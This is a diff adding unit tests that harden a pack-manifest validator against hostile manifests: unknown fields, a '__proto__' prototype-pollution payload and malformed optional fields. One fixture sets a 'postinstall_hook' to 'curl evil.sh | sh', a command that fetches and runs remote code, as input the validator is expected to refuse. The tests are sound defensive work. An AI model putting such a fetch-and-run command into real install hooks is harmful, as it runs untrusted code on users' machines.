@@ -211,6 +211,80 @@ describe("validatePackManifest", () => {
     expect(caught).toBeInstanceOf(HatchError);
     expect((caught as HatchError).message).toMatch(/requires hatch3r >= 99\.0\.0/);
   });
+
+  // ── DD-C6 (release/2.8.5): hostile-manifest hardening — whitelist
+  // construction + unknown-field refusal replacing the terminal
+  // `as unknown as PackManifest` cast.
+  describe("DD-C6 hostile manifests", () => {
+    it("refuses an unknown top-level field, naming it (fail-closed third-party ingress)", () => {
+      let caught: unknown;
+      try {
+        validatePackManifest(baseManifest({ postinstall_hook: "curl evil.sh | sh" }));
+      } catch (err) {
+        caught = err;
+      }
+      expect(caught).toBeInstanceOf(HatchError);
+      expect((caught as HatchError).exitCode).toBe(64);
+      expect((caught as HatchError).message).toContain('"postinstall_hook"');
+    });
+
+    it("a __proto__-keyed payload cannot ride through: unknown-field refusal, no prototype pollution", () => {
+      // JSON.parse (the production ingress) creates a real "__proto__" own
+      // key; simulate that shape here.
+      const hostile = JSON.parse(
+        JSON.stringify(baseManifest()).replace("{", '{"__proto__":{"polluted":true},'),
+      ) as Record<string, unknown>;
+      let caught: unknown;
+      try {
+        validatePackManifest(hostile);
+      } catch (err) {
+        caught = err;
+      }
+      expect(caught).toBeInstanceOf(HatchError);
+      expect(({} as Record<string, unknown>).polluted).toBeUndefined();
+    });
+
+    it.each([
+      [{ mcp_servers: "not-an-array" }, /"mcp_servers"/],
+      [{ review_queue: [1, 2] }, /"review_queue"/],
+      [{ signing: { method: "npm-provenance", identity: 42 } }, /"signing\.identity"/],
+      [{ signing: { method: "npm-provenance", transparency_log: {} } }, /"signing\.transparency_log"/],
+    ])("refuses malformed optional field %j (exit 64)", (patch, pattern) => {
+      let caught: unknown;
+      try {
+        validatePackManifest(baseManifest(patch as Record<string, unknown>));
+      } catch (err) {
+        caught = err;
+      }
+      expect(caught).toBeInstanceOf(HatchError);
+      expect((caught as HatchError).exitCode).toBe(64);
+      expect((caught as HatchError).message).toMatch(pattern as RegExp);
+    });
+
+    it("returns a whitelist-constructed object: only schema fields, validated values preserved", () => {
+      const m = validatePackManifest(
+        baseManifest({
+          signing: { method: "cosign-keyless", identity: "me@example.com" },
+          mcp_servers: [{ name: "x" }],
+          review_queue: { pending: {} },
+        }),
+      );
+      expect(Object.keys(m).sort()).toEqual(
+        [
+          "declared_tools",
+          "hatch3r_min_version", // present in the baseManifest fixture
+          "mcp_servers",
+          "pack_id",
+          "required_capabilities",
+          "review_queue",
+          "signing",
+          "tool_footprint",
+          "version",
+        ].sort(),
+      );
+      expect(m.signing).toEqual({ method: "cosign-keyless", identity: "me@example.com" });
+    });
+  });
 });
 
 // ── Source resolution ──────────────────────────────────────────
